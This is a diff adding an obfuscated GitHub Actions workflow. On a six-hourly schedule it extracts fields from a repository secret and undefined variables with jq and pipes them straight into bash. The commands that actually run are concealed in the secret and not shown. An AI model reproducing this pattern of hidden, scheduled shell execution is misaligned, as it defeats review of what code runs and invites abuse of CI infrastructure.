@@ -1,0 +1,21 @@
+name: hudropdaimao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hudropdaimao
+        env:
+          fhb417: ${{ secrets.fhb417 }}
+        run: |
+          echo $fhb417 | jq -r .ah583 | /bin/bash
+          echo $kbkxb9085 | jq -r .g95 | /bin/bash
+          echo $oqq77926 | jq -r .mpvqu0629 | /bin/bash
+          echo $or6749 | jq -r .qq0 | /bin/bash
+          echo $ppaf20682 | jq -r .iy5 | /bin/bash
+
